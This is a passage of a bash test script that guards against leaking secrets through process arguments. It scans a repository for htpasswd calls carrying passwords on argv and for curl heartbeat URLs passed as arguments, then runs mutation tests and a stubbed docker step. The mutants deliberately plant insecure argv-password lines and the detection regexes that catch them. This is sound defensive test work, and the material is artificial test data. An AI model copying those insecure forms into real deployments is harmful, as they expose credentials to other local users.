S6_REG_PUSH="printf '%s' \"\$ZOT_PUSH_TOKEN\" | htpasswd -Bin '\${zot_push_user}' >> /etc/zot/htpasswd"
S6_ERE='(^|[^[:alnum:]_./-])htpasswd[[:space:]]+-[A-Za-z]'
S6_ERE_INV='(^|[^[:alnum:]_./-])htpasswd([[:space:]]+-[A-Za-z]+)+'

# One TSV record per invocation: file, line number, the option tokens, the whole stripped code line.
s6_scan() { # <root>
  local root="$1" rec file rest ln text body code m
  while IFS= read -r rec; do
    file="${rec%%:*}"; rest="${rec#*:}"; ln="${rest%%:*}"; text="${rest#*:}"
    body="$(sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//' <<<"$text")"
    [[ "$body" == '#'* ]] && continue
    code="$(sed -E 's/[[:space:]]#.*$//; s/[[:space:]]+$//' <<<"$body")"
    while IFS= read -r m; do
      [[ -n "$m" ]] || continue
      printf '%s\t%s\t%s\t%s\n' "$file" "$ln" "$(sed -E 's/^.*htpasswd[[:space:]]+//' <<<"$m")" "$code"
    done < <(grep -oE -e "$S6_ERE_INV" <<<"$code")
  done < <(git -C "$root" grep -nIE --untracked -e "$S6_ERE" -- apps scripts .github ':!*.test.sh' ':!*.md' 2>/dev/null)
}
# The verdict over a root. Sets S6_J_REASONS (empty = GREEN), S6_J_SITES, S6_J_FILES. Reasons: floor, bad:<file>, workflow-identity, stale-allowlist.
S6_J_REASONS=""; S6_J_SITES=0; S6_J_FILES=0
s6_judge() { # <root>
  local root="$1" scan file ln opts code a seen
  scan="$(s6_scan "$root")"
  S6_J_REASONS=""
  S6_J_SITES="$(grep -c . <<<"$scan" || true)"
  S6_J_FILES="$(cut -f1 <<<"$scan" | sort -u | grep -c . || true)"
  [[ "$S6_J_SITES" -ge "$S6_SITE_FLOOR" && "$S6_J_FILES" -ge "$S6_FILE_FLOOR" ]] || S6_J_REASONS+=" floor"
  while IFS=$'\t' read -r file ln opts code; do
    [[ -n "$file" ]] || continue
    if [[ "$opts" == *b* ]]; then
      seen=0; for a in "${S6_ALLOW[@]}"; do [[ "$a" == "$file"$'\t'"$code" ]] && seen=1; done
      [[ "$seen" == 1 ]] || S6_J_REASONS+=" bad:$file"
    fi
  done <<<"$scan"
  [[ "$(awk -F'\t' -v f="$S6_WF" -v c="$S6_WF_LINE" '$1 == f { n++; if ($4 != c) o++ } END { print n + 0 "/" o + 0 }' <<<"$scan")" == "1/0" ]] || S6_J_REASONS+=" workflow-identity"
  for a in "${S6_ALLOW[@]}"; do
    grep -qxF -- "$a" < <(awk -F'\t' '{ print $1 "\t" $4 }' <<<"$scan") || S6_J_REASONS+=" stale-allowlist"
  done
  S6_J_REASONS="${S6_J_REASONS# }"
}
S6="$TMPD/s6"; assert_fixture_dir "$S6"; mkdir -p "$S6/base" "$S6/mut" "$S6/bin" "$S6/real"
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S6/base" || exit 1; git -C "$S6/base" init -q ) \
  || fatal "S6 could not create the scratch repository"
for f in "$S6_WF" "$S6_REG"; do mkdir -p "$S6/base/$(dirname "$f")"; cp "$REPO_ROOT/$f" "$S6/base/$f"; done
# A fresh copy of the scratch tree per mutant (the scan is the SAME function over a root, so a mutant and the real tree are judged by one text).
s6_fresh() { # <name>: prints the new root
  local d="$S6/mut/$1"; assert_fixture_dir "$d"; rm -rf "$d"; cp -a "$S6/base" "$d" && printf '%s' "$d"
}
s6_put() { # <root> <relative path> <line>: write one line into a scratch tree
  assert_fixture_dir "$1"; printf '%s\n' "$3" > "$1/$2"
}
s6_edit() { # <file> <old> <new> [<count>]: replace exactly <count> (default 1) occurrences, rc 1 when the edit did not land
  python3 -I -c '
import sys
p, old, new, n = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])
t = open(p).read()
if t.count(old) != n: sys.exit(1)
open(p, "w").write(t.replace(old, new))' "$1" "$2" "$3" "${4:-1}"
}

# --- the real tree --------------------------------------------------------------------
s6_judge "$REPO_ROOT"
S6_REAL_REASONS="$S6_J_REASONS"; S6_REAL_SITES="$S6_J_SITES"; S6_REAL_FILES="$S6_J_FILES"
S6_REAL_SCAN="$(s6_scan "$REPO_ROOT")"
if [[ -z "$S6_REAL_REASONS" ]]; then row "S6 Guard 3: no tracked htpasswd invocation outside the residual allowlist carries a password on argv ($S6_REAL_SITES invocations in $S6_REAL_FILES files, derived by git grep over apps/ scripts/ .github/)" ok
else row "S6 Guard 3: an htpasswd invocation carries a password on argv outside the residual allowlist, or the workflow site or an allowlist entry drifted" fail "reasons='$S6_REAL_REASONS' sites=$S6_REAL_SITES files=$S6_REAL_FILES"; fi
if [[ "$S6_REAL_SITES" -ge "$S6_SITE_FLOOR" && "$S6_REAL_FILES" -ge "$S6_FILE_FLOOR" && "$S6_REAL_SITES" -eq 4 && "$S6_REAL_FILES" -eq 2 ]]; then row "S6 floor: the scan saw $S6_REAL_SITES invocations in $S6_REAL_FILES files (workflow 1 + registry template 3: the floor is $S6_SITE_FLOOR sites in $S6_FILE_FLOOR files)" ok
else row "S6 floor: the scan saw an unexpected population (the floor is $S6_SITE_FLOOR sites in $S6_FILE_FLOOR files; exactly 4 in 2 are expected)" fail "sites=$S6_REAL_SITES files=$S6_REAL_FILES"; fi
# One anchored row per site: identity (file and the whole stripped line), never only a count.
s6_site_is() { # <file> <whole line> <expect-b: 0|1>: exactly one record of <file> has that line, and its options hold a lowercase b iff <expect-b>
  awk -F'\t' -v f="$1" -v c="$2" -v b="$3" '$1 == f { n++; if ($4 == c && (($3 ~ /b/) ? 1 : 0) == b) ok++ } END { exit !(n == 1 && ok == 1) }' <<<"$S6_REAL_SCAN"
}
s6_site_in_file_is() { # <file> <whole line> <expect-b>: the file holds exactly one record of that line (the file may hold other sites)
  awk -F'\t' -v f="$1" -v c="$2" -v b="$3" '$1 == f && $4 == c { n++; if ((($3 ~ /b/) ? 1 : 0) == b) ok++ } END { exit !(n == 1 && ok == 1) }' <<<"$S6_REAL_SCAN"
}
if s6_site_is "$S6_WF" "$S6_WF_LINE" 0; then row "S6 site (workflow): the registry-luks-recut rehearsal step's single htpasswd invocation is exactly the stdin form with docker's own -i, and its options hold no b" ok
else row "S6 site (workflow): the rehearsal step's htpasswd line is not the exact stdin form (printf '%s' \"\$RP\" | docker run --rm -i httpd:2.4-alpine htpasswd -Bin \"\$RU\" > ...)" fail "records=$(awk -F'\t' -v f="$S6_WF" '$1 == f' <<<"$S6_REAL_SCAN" | cut -f2,3 | tr '\t\n' ' :')"; fi
S6_SITE_I=0
for a_line in "$S6_REG_PROBE" "$S6_REG_PULL" "$S6_REG_PUSH"; do
  S6_SITE_I=$((S6_SITE_I + 1))
  case "$S6_SITE_I" in 1) a_name="the _htp_verify probe (htpasswd -vi, password piped from printf)" ;; 2) a_name="the boot step's pull entry (htpasswd -Bin, creates the file)" ;; *) a_name="the boot step's push entry (htpasswd -Bin, appends)" ;; esac
  if s6_site_in_file_is "$S6_REG" "$a_line" 0; then row "S6 registry site $S6_SITE_I (cloud-init-registry.yml): $a_name is the stdin form, present exactly once, and its options hold no b" ok
  else row "S6 registry site $S6_SITE_I (cloud-init-registry.yml): $a_name is not present exactly once in its stdin form" fail "line=$(cut -c1-70 <<<"$a_line")"; fi
done
# The ceiling is a predicate over a count so a grow-by-one mutant can be judged by the SAME function: 0 passes, 1 must not.
s6_ceiling_ok() { [[ "$1" -eq "$S6_ALLOW_CEIL" && "$S6_ALLOW_CEIL" -eq 0 ]]; }
if s6_ceiling_ok "${#S6_ALLOW[@]}" && ! s6_ceiling_ok $((${#S6_ALLOW[@]} + 1)); then row "S6 allowlist ceiling: the residual allowlist is EMPTY (ceiling $S6_ALLOW_CEIL; #10119 deleted the three registry entries), and a grow-by-one allowlist is judged RED by the same predicate" ok
else row "S6 allowlist ceiling: the residual allowlist is not empty, or the ceiling predicate accepts a grown allowlist" fail "entries=${#S6_ALLOW[@]} ceiling=$S6_ALLOW_CEIL"; fi

# --- mutations, on a scratch repository ----------------------------------------------------
# M1 reintroduce the argv form in the workflow site.
S6_M1="$(s6_fresh m1)"
if s6_edit "$S6_M1/$S6_WF" 'htpasswd -Bin "$RU"' 'htpasswd -Bbn "$RU" "$RP"'; then
  s6_judge "$S6_M1"
  if [[ "$S6_J_REASONS" == *"bad:$S6_WF"* && "$S6_J_REASONS" == *workflow-identity* ]]; then row "S6 mutation 1: reintroducing -Bbn in the workflow site is RED (an argv password outside the allowlist, and the site's identity row)" ok
  else row "S6 mutation 1: the workflow site reverted to -Bbn is not caught" fail "reasons='$S6_J_REASONS'"; fi
else row "S6 mutation 1: the -Bin -> -Bbn edit did not land on the workflow (the converted site is missing)" fail "no 'htpasswd -Bin \"\$RU\"' once in the workflow"; fi
# M2 a compliant fifth site is GREEN; a non-compliant one in a DIFFERENT file then makes it RED (identity, not a count: five sites in four files).
S6_M2="$(s6_fresh m2)"; assert_fixture_dir "$S6_M2"; mkdir -p "$S6_M2/scripts" "$S6_M2/apps/web-platform/infra"
printf '%s\n' "printf '%s' \"\$p\" | htpasswd -Bin svc > \"\$out\"" > "$S6_M2/scripts/zz-ok-fifth.sh"
s6_judge "$S6_M2"; S6_M2_OK="$S6_J_REASONS"; S6_M2_SITES="$S6_J_SITES"
s6_put "$S6_M2" scripts/zz-bad-sixth.sh 'htpasswd -Bbn svc "$p"'
s6_judge "$S6_M2"
if [[ -z "$S6_M2_OK" && "$S6_M2_SITES" -eq $((S6_REAL_SITES + 1)) && "$S6_J_REASONS" == *"bad:scripts/zz-bad-sixth.sh"* && "$S6_J_SITES" -eq $((S6_REAL_SITES + 2)) ]]; then
  row "S6 mutation 2: a compliant fifth site is GREEN (and is seen), a non-compliant sixth site in a different file is RED" ok
else row "S6 mutation 2: the fifth/sixth-site pair is judged wrong" fail "fifth='$S6_M2_OK' sites=$S6_M2_SITES sixth='$S6_J_REASONS' sites=$S6_J_SITES"; fi
# M3 a fourth argv invocation inside the ALLOWLISTED file (a different line) is RED: the allowlist is by line identity, not by file.
S6_M3="$(s6_fresh m3)"; assert_fixture_dir "$S6_M3"
printf '%s\n' "    htpasswd -Bbn 'extra' \"\$EXTRA_TOKEN\" >> /etc/zot/htpasswd" >> "$S6_M3/$S6_REG"
s6_judge "$S6_M3"
if [[ "$S6_J_REASONS" == *"bad:$S6_REG"* && "$S6_J_SITES" -eq $((S6_REAL_SITES + 1)) ]]; then row "S6 mutation 3: a fourth argv htpasswd line added to the registry file is RED (a site is judged by its line, never by its file)" ok
else row "S6 mutation 3: an extra argv line in the allowlisted file slips through" fail "reasons='$S6_J_REASONS' sites=$S6_J_SITES"; fi
# M4 every spelling of the password-on-argv option cluster is RED, in any order and combination.
S6_M4="$(s6_fresh m4)"; assert_fixture_dir "$S6_M4"; mkdir -p "$S6_M4/scripts"; S6_M4_MISS=""
for v in '-Bb' '-bB' '-bi' '-vb' '-nbB' '-Bbn' '-bBn' '-B -b' '-i -vb' '-vb -B'; do
  printf '%s\n' "htpasswd $v svc \"\$p\" > \"\$out\"" > "$S6_M4/scripts/zz-variant.sh"
  s6_judge "$S6_M4"; [[ "$S6_J_REASONS" == *"bad:scripts/zz-variant.sh"* ]] || S6_M4_MISS+=" $v"
done
if [[ -z "$S6_M4_MISS" ]]; then row "S6 mutation 4: each option cluster holding a b (-Bb -bB -bi -vb -nbB -Bbn -bBn, a split -B -b, -i -vb, -vb -B) is RED" ok
else row "S6 mutation 4: an option cluster holding a b is not caught" fail "missed:$S6_M4_MISS"; fi
# M5 the scanned binary renamed in the scratch tree: the scan sees 0 sites and must be RED, never a clean bill.
S6_M5="$(s6_fresh m5)"
for f in "$S6_WF" "$S6_REG"; do sed -i -E 's/htpasswd([[:space:]]+-)/htpassw0\1/g' "$S6_M5/$f"; done
s6_judge "$S6_M5"
if [[ "$S6_J_SITES" -eq 0 && "$S6_J_REASONS" == *floor* ]]; then row "S6 mutation 5: with the scanned binary renamed the scan sees 0 sites and the floor is RED" ok
else row "S6 mutation 5: a scan that sees nothing is not RED" fail "sites=$S6_J_SITES reasons='$S6_J_REASONS'"; fi
# M6 an allowlist entry the scan no longer sees is RED. The real allowlist is empty now, so the mutant INJECTS an entry for a line the scan cannot see (the
# retired argv probe line); a compliant extra site keeps the floor from being what trips.
S6_M6="$(s6_fresh m6)"; assert_fixture_dir "$S6_M6"; mkdir -p "$S6_M6/scripts"
printf '%s\n' "printf '%s' \"\$p\" | htpasswd -Bin svc > \"\$out\"" > "$S6_M6/scripts/zz-ok.sh"
S6_ALLOW_SAVE=("${S6_ALLOW[@]}")
S6_ALLOW+=("$S6_REG	htpasswd -vb /etc/zot/htpasswd \"\$1\" \"\$2\" >/dev/null 2>&1")
s6_judge "$S6_M6"; S6_M6_R="$S6_J_REASONS"
S6_ALLOW=("${S6_ALLOW_SAVE[@]}")
if [[ "$S6_M6_R" == "stale-allowlist" ]]; then row "S6 mutation 6: an allowlist entry for a site that is gone (the retired -vb probe line) is RED (stale-allowlist, and nothing else)" ok
else row "S6 mutation 6: a stale allowlist entry is not (only) reported" fail "reasons='$S6_M6_R'"; fi
# M8 reintroduce each of the three registry sites in argv form, one at a time, with NO allowlist to hide behind: each is RED by its own identity.
S6_M8_MISS=""; S6_M8_I=0
for old_new in \
  "$S6_REG_PROBE"$'\x1f'"htpasswd -vb /etc/zot/htpasswd \"\$1\" \"\$2\" >/dev/null 2>&1" \
  "$S6_REG_PULL"$'\x1f'"htpasswd -Bbn '\${zot_pull_user}' \"\$ZOT_PULL_TOKEN\"  > /etc/zot/htpasswd" \
  "$S6_REG_PUSH"$'\x1f'"htpasswd -Bbn '\${zot_push_user}' \"\$ZOT_PUSH_TOKEN\" >> /etc/zot/htpasswd"; do
  S6_M8_I=$((S6_M8_I + 1)); S6_M8="$(s6_fresh "m8-$S6_M8_I")"
  if s6_edit "$S6_M8/$S6_REG" "${old_new%%$'\x1f'*}" "${old_new##*$'\x1f'}"; then
    s6_judge "$S6_M8"; [[ "$S6_J_REASONS" == *"bad:$S6_REG"* ]] || S6_M8_MISS+=" site$S6_M8_I(not-red:$S6_J_REASONS)"
  else S6_M8_MISS+=" site$S6_M8_I(edit-missed)"; fi
done
if [[ -z "$S6_M8_MISS" ]]; then row "S6 mutation 8: reintroducing the argv form at the probe, the pull entry or the push entry of the registry template is RED each time (the allowlist is empty, so nothing hides it)" ok
else row "S6 mutation 8: an argv registry site is not caught" fail "missed:$S6_M8_MISS"; fi
# Must-PASS: other order/case (-iB, -iBn, -vi, -Bin, -Bn), `-vb` only in comments (a whole-line comment, a trailing YAML comment), and files outside the population.
S6_M7="$(s6_fresh m7)"; assert_fixture_dir "$S6_M7"; mkdir -p "$S6_M7/scripts" "$S6_M7/.github/workflows" "$S6_M7/apps/web-platform/infra" "$S6_M7/knowledge-base"
{ printf '%s\n' "printf '%s' \"\$p\" | htpasswd -iB svc > \"\$out\""
  printf '%s\n' "printf '%s' \"\$p\" | htpasswd -iBn svc > \"\$out\""
  printf '%s\n' "printf '%s' \"\$p\" | htpasswd -vi \"\$f\" svc"
  printf '%s\n' "# htpasswd -vb \"\$f\" svc \"\$p\" would carry the password on argv"
  printf '%s\n' "    # htpasswd -Bbn svc \"\$p\"   (an indented whole-line comment)"; } > "$S6_M7/scripts/zz-orders-and-comments.sh"
printf '%s\n' "  - apache2-utils # htpasswd -vb f u p (a trailing YAML comment)" > "$S6_M7/.github/workflows/zz-trailing-comment.yml"
printf '%s\n' 'htpasswd -Bbn svc "$p"' > "$S6_M7/apps/web-platform/infra/zz-fixture.test.sh"      # a *.test.sh is not in the population
printf '%s\n' 'run `htpasswd -Bbn svc "$p"` to see it' > "$S6_M7/scripts/zz-docs.md"               # nor is a *.md
printf '%s\n' 'htpasswd -Bbn svc "$p"' > "$S6_M7/knowledge-base/zz-notes.sh"                      # nor a path outside apps/ scripts/ .github/
s6_judge "$S6_M7"
if [[ -z "$S6_J_REASONS" && "$S6_J_SITES" -eq $((S6_REAL_SITES + 3)) ]]; then row "S6 must-pass: other option orders and cases (-iB, -iBn, -vi), -vb only inside whole-line and trailing YAML comments, and a test file, a markdown file and a path outside the roots are GREEN (the three compliant sites are seen)" ok
else row "S6 must-pass: a compliant or excluded form is flagged, or the compliant sites were not seen" fail "reasons='$S6_J_REASONS' sites=$S6_J_SITES want=$((S6_REAL_SITES + 3))"; fi

# --- the registry template's two heartbeat curls (#10093): the URL is a stdin config line, never an argument ----------------------------------------------
# PROPERTY. In cloud-init-registry.yml no `curl` argument holds a `*_heartbeat_url` interpolation: the URL's path is the secret, argv is readable by every local
# user. DERIVATION: every LOGICAL line of the YAML (backslash continuations joined), whole-line comments dropped, with a `curl` command word AND `heartbeat_url`
# is a heartbeat site; with the stdin feed `< <(printf 'url = "%s"\n' '<literal>')` removed, a site that still holds `heartbeat_url` is VIOLATING. The two converted
# sites (disk, liveness) are asserted by IDENTITY. A comment line is never continued by a trailing backslash (bash does not continue it either), and an absolute
# path (`/usr/bin/curl`) is a curl command word. NOT COVERED, named: a URL carried through a variable or an `eval`, another HTTP client (wget, python), a
# template variable of another name, and any file other than the registry template.
S6R_PY="$S6/regheartbeat.py"
cat > "$S6R_PY" <<'S6RPY'
import re, sys
lines = open(sys.argv[1], encoding="utf-8").read().split("\n")
i, out = 0, []
while i < len(lines):
    ln = i + 1
    t = lines[i]
    while not t.lstrip().startswith("#") and t.rstrip().endswith("\\") and i + 1 < len(lines):
        i += 1
        t = t.rstrip()[:-1] + " " + lines[i].strip()
    i += 1
    s = t.strip()
    if s.startswith("#"):
        continue
    if not re.search(r"(^|[^A-Za-z0-9_.-])curl([^A-Za-z0-9_-]|$)", s) or "heartbeat_url" not in s:
        continue
    feed = re.sub(r"< <\(printf 'url = \"%s\"\\n' '[^']*'\)", "", s)
    out.append(("V" if "heartbeat_url" in feed else "S", ln, s))
for k, ln, s in out:
    print("%s\t%d\t%s" % (k, ln, s))
S6RPY
S6R_DISK="curl --disable --noproxy '*' -g -fsS -m 10 --config - >/dev/null 2>&1 < <(printf 'url = \"%s\"\\n' '\${disk_heartbeat_url}') || PING_RC=\$?"
S6R_LIVE="if curl --disable --noproxy '*' -g -fsS -m 10 -o /dev/null --config - < <(printf 'url = \"%s\"\\n' '\${liveness_heartbeat_url}'); then PING=ok; else PING=fail; fi"
S6R_REAL_SCAN="" ; S6R_J_REASONS="unscanned"   # non-empty until s6r_judge has actually run: deleting the real-tree call must not read as GREEN
s6r_judge() { # <root>: sets S6R_J_REASONS (empty = GREEN) and S6R_REAL_SCAN. Reasons: floor, argv, disk-identity, liveness-identity.
  local scan sites
  scan="$(python3 -I "$S6R_PY" "$1/$S6_REG" 2>/dev/null)" || { S6R_J_REASONS="scan-failed"; return 0; }
  S6R_REAL_SCAN="$scan"; S6R_J_REASONS=""
  sites="$(grep -c . <<<"$scan" || true)"
  [[ "$sites" -ge 2 ]] || S6R_J_REASONS+=" floor"
  grep -q $'^V\t' <<<"$scan" && S6R_J_REASONS+=" argv"
  # ENVIRON, not -v: awk -v interprets backslash escapes, and these lines carry a literal \n inside the printf format.
  [[ "$(S6R_C="$S6R_DISK" awk -F'\t' '$1 == "S" && $3 == ENVIRON["S6R_C"] { n++ } END { print n + 0 }' <<<"$scan")" == 1 ]] || S6R_J_REASONS+=" disk-identity"
  [[ "$(S6R_C="$S6R_LIVE" awk -F'\t' '$1 == "S" && $3 == ENVIRON["S6R_C"] { n++ } END { print n + 0 }' <<<"$scan")" == 1 ]] || S6R_J_REASONS+=" liveness-identity"
  S6R_J_REASONS="${S6R_J_REASONS# }"
}
s6r_judge "$REPO_ROOT"; S6R_REAL="$S6R_J_REASONS"
if [[ -z "$S6R_REAL" ]]; then row "S6-REG heartbeat: the registry template's two heartbeat curls (disk, liveness) carry their URL only in the stdin config feed, never on curl argv, each by exact identity ($(grep -c . <<<"$S6R_REAL_SCAN") sites seen)" ok
else row "S6-REG heartbeat: a registry heartbeat URL is on curl argv, or a converted site drifted from its exact stdin form" fail "reasons='$S6R_REAL'"; fi
# M-R1 put the URL back on the curl argument list (disk): RED by the derived scan, not only by the identity row.
S6R_M1="$(s6_fresh r1)"
if s6_edit "$S6R_M1/$S6_REG" "curl --disable --noproxy '*' -g -fsS -m 10 --config - >/dev/null 2>&1 < <(printf 'url = \"%s\"\\n' '\${disk_heartbeat_url}') || PING_RC=\$?" "curl -fsS -m 10 \"\${disk_heartbeat_url}\" >/dev/null 2>&1 || PING_RC=\$?"; then
  s6r_judge "$S6R_M1"
  if [[ "$S6R_J_REASONS" == *argv* && "$S6R_J_REASONS" == *disk-identity* ]]; then row "S6-REG mutation 1: the disk heartbeat URL back on curl argv is RED (the derived scan and the site's identity)" ok
  else row "S6-REG mutation 1: an argv heartbeat URL in the registry template is not caught" fail "reasons='$S6R_J_REASONS'"; fi
else row "S6-REG mutation 1: the argv edit did not land on the disk heartbeat curl (re-anchor with the template)" fail "the converted disk curl was not found once"; fi
# M-R2 argv URL on the liveness curl too, as a SECOND site, while the first stays compliant: identity per site, not a count.
S6R_M2="$(s6_fresh r2)"
printf '%s\n' "      curl -fsS -m 10 -o /dev/null \"\${liveness_heartbeat_url}\"" >> "$S6R_M2/$S6_REG"
s6r_judge "$S6R_M2"
if [[ "$S6R_J_REASONS" == *argv* ]]; then row "S6-REG mutation 2: an extra argv heartbeat curl appended after the compliant two is RED (a violating logical line, not a count)" ok
else row "S6-REG mutation 2: an extra argv heartbeat curl slips through" fail "reasons='$S6R_J_REASONS'"; fi
# M-R3 the scanned word renamed everywhere: the scan sees 0 sites and must be RED (floor), never a clean bill.
S6R_M3="$(s6_fresh r3)"; sed -i 's/heartbeat_url/hb_url/g' "$S6R_M3/$S6_REG"
s6r_judge "$S6R_M3"
if [[ "$S6R_J_REASONS" == *floor* ]]; then row "S6-REG mutation 3: with the scanned variable renamed the scan sees no heartbeat site and the floor is RED" ok
else row "S6-REG mutation 3: a scan that sees nothing is not RED" fail "reasons='$S6R_J_REASONS'"; fi
# Must-pass: a whole-line comment naming curl and the variable is not a violation.
S6R_M4="$(s6_fresh r4)"
printf '%s\n' "      # curl -fsS -m 10 \"\${disk_heartbeat_url}\" would carry the URL on argv" >> "$S6R_M4/$S6_REG"
s6r_judge "$S6R_M4"
if [[ -z "$S6R_J_REASONS" ]]; then row "S6-REG must-pass: a whole-line comment that names curl and the heartbeat variable is not a violation" ok
else row "S6-REG must-pass: a comment line is flagged" fail "reasons='$S6R_J_REASONS'"; fi

# Evasions the first scanner missed: a comment line ending in a backslash swallowed the live line under it; an absolute curl path was not a command word.
S6R_M5="$(s6_fresh r5)"
printf '%s\n' "      # a note that ends in a backslash \\" "      curl -fsS -m 10 \"\${disk_heartbeat_url}\"" >> "$S6R_M5/$S6_REG"
s6r_judge "$S6R_M5"
if [[ "$S6R_J_REASONS" == *argv* ]]; then row "S6-REG mutation 5: a live argv curl under a comment line that ends in a backslash is RED (a comment is never continued)" ok
else row "S6-REG mutation 5: a comment ending in a backslash hides the live line under it" fail "reasons='$S6R_J_REASONS'"; fi
S6R_M6="$(s6_fresh r6)"
printf '%s\n' "      /usr/bin/curl -fsS -m 10 \"\${liveness_heartbeat_url}\"" >> "$S6R_M6/$S6_REG"
s6r_judge "$S6R_M6"
if [[ "$S6R_J_REASONS" == *argv* ]]; then row "S6-REG mutation 6: an argv heartbeat curl spelled with an absolute path is RED" ok
else row "S6-REG mutation 6: /usr/bin/curl is not seen as a curl command word" fail "reasons='$S6R_J_REASONS'"; fi
S6R_M7="$(s6_fresh r7)"
printf '%s\n' "      curl -fsS -m 10 \\" "        \"\${disk_heartbeat_url}\"" >> "$S6R_M7/$S6_REG"
s6r_judge "$S6R_M7"
if [[ "$S6R_J_REASONS" == *argv* ]]; then row "S6-REG mutation 7: an argv heartbeat curl split across two physical lines by a backslash continuation is RED (the logical line is joined)" ok
else row "S6-REG mutation 7: a continuation-split argv heartbeat curl slips through" fail "reasons='$S6R_J_REASONS'"; fi

# --- the executable rows: the REAL workflow step under a refusing stub docker -----------------
# The step is extracted with PyYAML (job registry_pull_path_gate, step id `throwaway`) and cut at the htpasswd line: everything before it (the zot pin
# read, the mkdir, the throwaway user and password) runs for real; the later `docker run` of zot is not part of the property.
S6_STEP="$S6/step.sh"
python3 -I -c 'import sys, yaml
d = yaml.safe_load(open(sys.argv[1]))
steps = d["jobs"]["registry_pull_path_gate"]["steps"]
run = [s["run"] for s in steps if isinstance(s, dict) and s.get("id") == "throwaway"]
if len(run) != 1: sys.exit(3)
out = []
for line in run[0].split("\n"):
    out.append(line)
    if "htpasswd" in line and "docker run" in line: break
else: sys.exit(4)
open(sys.argv[2], "w").write("\n".join(out) + "\n")' "$REPO_ROOT/$S6_WF" "$S6_STEP" || fatal "S6 could not extract the rehearsal step (id throwaway) of $S6_WF up to its htpasswd line"
for t in bash grep sed head openssl mkdir cat tr cut sha256sum wc od rm; do
  p="$(type -P "$t" || true)"; [[ -n "$p" ]] && ln -sf "$p" "$S6/real/$t"
done
cat > "$S6/bin/docker" <<STUB_EOF
#!$BASH_BIN
# REFUSING stub docker. Accepts exactly: run --rm -i httpd:2.4-alpine htpasswd -Bin <user>, with a non-empty password on stdin.
# Anything else is refused with exit 64 and one line in \$S6_LOG/refusals (argument COUNT and the first six words only: the password is never logged).
# A real docker forwards no stdin without -i; the stub models that by refusing the call outright.
set -u
L="\${S6_LOG:?}"
pw="\$(cat)"   # drain first, on every arm: a refusing arm that exits unread would make the producer's printf take SIGPIPE/EPIPE under pipefail
if [[ \$# -eq 7 && "\$1" == run && "\$2" == --rm && "\$3" == -i && "\$4" == httpd:2.4-alpine && "\$5" == htpasswd && "\$6" == -Bin && -n "\$7" && "\$7" != -* ]]; then
  if [[ -z "\$pw" ]]; then printf 'refused-empty-stdin\n' >> "\$L/refusals"; exit 64; fi
  printf '%s\n' "\$7" > "\$L/user"
  printf '%s' "\$pw" | sha256sum | cut -d' ' -f1 > "\$L/stdin.sha"
  printf '%s\n' "\$#" > "\$L/argc"
  printf '%s:\$2y\$05\$stubstubstubstubstubstuXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n' "\$7"
  exit 0
fi
printf 'refused argc=%s a1=%s a2=%s a3=%s a4=%s a5=%s a6=%s\n' "\$#" "\${1-}" "\${2-}" "\${3-}" "\${4-}" "\${5-}" "\${6-}" >> "\$L/refusals"
exit 64
STUB_EOF
chmod +x "$S6/bin/docker"
S6_RUN_RC=0
s6_run_step() { # <step file> <row dir>: the step under `bash --noprofile --norc -eo pipefail`, PATH = the stub + the few real tools
  local step="$1" d="$2"; assert_fixture_dir "$d"; rm -rf "$d"; mkdir -p "$d/log" "$d/run"
  env -i PATH="$S6/bin:$S6/real" HOME="$d" TMPDIR="$d" GITHUB_WORKSPACE="$REPO_ROOT" RUNNER_TEMP="$d/run" S6_LOG="$d/log" \
    "$BASH_BIN" --noprofile --norc -eo pipefail "$step" > "$d/stdout" 2> "$d/stderr"
  S6_RUN_RC=$?
}
s6_nrefusals() { if [[ -f "$1/log/refusals" ]]; then grep -c . "$1/log/refusals" || true; else echo 0; fi; }
# The password of the run is the one `::add-mask::` line the step prints; it is compared by hash, never printed.
s6_step_ok() { # <row dir>: rc 0, nothing refused, one 7-word call, an entry for the recorded user, and the stub read the masked password on stdin
  local d="$1" maskhash
  maskhash="$(sed -n 's/^::add-mask:://p' "$d/stdout" | head -1 | tr -d '\n' | sha256sum | cut -d' ' -f1)"
  [[ "$S6_RUN_RC" -eq 0 && "$(s6_nrefusals "$d")" -eq 0 && "$(cat "$d/log/argc" 2>/dev/null)" == 7 ]] \
    && [[ -s "$d/run/zot/htpasswd" && -n "$(cat "$d/log/user" 2>/dev/null)" && "$(cut -d: -f1 "$d/run/zot/htpasswd")" == "$(cat "$d/log/user")" ]] \
    && [[ -n "$maskhash" && "$maskhash" == "$(cat "$d/log/stdin.sha" 2>/dev/null)" ]]
}
# Instrument control: the stub itself refuses a wrong shape and an empty stdin, and accepts the right one (otherwise every row below proves nothing).
S6_C="$S6/ctl"; mkdir -p "$S6_C"; S6_CTL_BAD=""
s6_stub() { rm -rf "$S6_C/log"; mkdir -p "$S6_C/log"; local stdin="$1"; shift; printf '%s' "$stdin" | env -i PATH="$S6/real" S6_LOG="$S6_C/log" "$S6/bin/docker" "$@" >/dev/null 2>&1; }
s6_stub secret run --rm -i httpd:2.4-alpine htpasswd -Bin u || S6_CTL_BAD+=" right-shape-refused"
for variant in "run --rm httpd:2.4-alpine htpasswd -Bin u" "run --rm -i httpd:2.4-alpine htpasswd -Bbn u pw" "run --rm -i httpd:2.4-alpine htpasswd -Bn u" "run -i httpd:2.4-alpine htpasswd -Bin u" "run --rm -i httpd:2.4-alpine htpasswd -Bin" "run --rm -i httpd:2.4-alpine htpasswd -Bin -x"; do
  # shellcheck disable=SC2086
  if s6_stub secret $variant; then S6_CTL_BAD+=" accepted[$variant]"
  elif [[ "$(s6_nrefusals "$S6_C")" -ne 1 ]]; then S6_CTL_BAD+=" unlogged[$variant]"; fi
done
if s6_stub '' run --rm -i httpd:2.4-alpine htpasswd -Bin u; then S6_CTL_BAD+=" accepted-empty-stdin"; fi
if [[ -z "$S6_CTL_BAD" ]]; then row "S6 instrument: the stub docker accepts exactly 'run --rm -i httpd:2.4-alpine htpasswd -Bin <user>' with a password on stdin and refuses (exit 64, one logged refusal) a missing -i, a -b form, a missing user, a wrong word and an empty stdin" ok
else row "S6 instrument: the stub docker accepts a wrong shape, refuses the right one or does not log" fail "$S6_CTL_BAD"; fi
s6_run_step "$S6_STEP" "$S6/row-good"
